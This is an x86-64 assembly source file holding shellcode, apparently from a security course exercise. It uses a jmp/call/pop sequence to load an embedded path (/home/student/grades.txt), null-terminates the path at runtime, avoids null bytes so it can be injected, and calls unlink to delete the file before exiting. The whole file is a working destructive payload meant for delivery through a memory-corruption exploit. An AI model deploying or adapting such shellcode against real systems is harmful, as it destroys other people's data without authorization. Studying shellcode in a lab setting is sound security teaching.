#include <sys/syscall.h>
#define STRING	"/home/student/grades.txt"
#define STRLEN 24

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popaddr:
	/* unlink file */
	popq	%rdi				/* syscall arg 1: pointer to file name */
	xorq	%rax, %rax			/* we use xorq/movb instead of movq b/c movq generates null bytes */
	movb	%al, STRLEN(%rdi)	/* null-terminate our file name */
	movb	$SYS_unlink, %al
	syscall

	/* exit */
	xorq	%rax, %rax
	movb	$SYS_exit, %al
	xorq	%rdi, %rdi			/* syscall arg 1: exit code 0 */
	syscall

 calladdr:
	call	popaddr
	.ascii	STRING